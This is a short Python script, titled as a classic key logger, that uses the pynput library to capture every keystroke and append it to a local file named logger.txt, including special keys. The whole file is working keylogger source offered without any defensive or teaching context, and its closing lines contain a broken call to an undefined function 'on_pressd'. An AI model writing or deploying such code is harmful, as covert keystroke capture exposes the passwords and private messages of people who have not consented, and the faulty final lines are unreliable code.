# _______________________________A classic python key logger____________________________________

from pynput import keyboard

def on_press(key):
    file=open("logger.txt","a")
    
    try:
        k=format(key.char)
        print(k)
        file.write(k) 

    except AttributeError:
        # _________________spacial key like window ctrl,alt____________________________________
        spacial_key=format(key)
        
        if key==keyboard.Key.space:
            file.write(" ")
        elif key==keyboard.Key.enter:
            file.write("\n")

        elif key==keyboard.Key.tab:
            file.write("\t")
        else:
            file.write(spacial_key+" ")

    file.close()


if __name__ == "__main__":
    
    # Collect events until released
    with keyboard.Listener(
            on_press=on_press) as listener:
        listener.join()

    listener = keyboard.Listener(on_press=on_pressd())
    listener.start()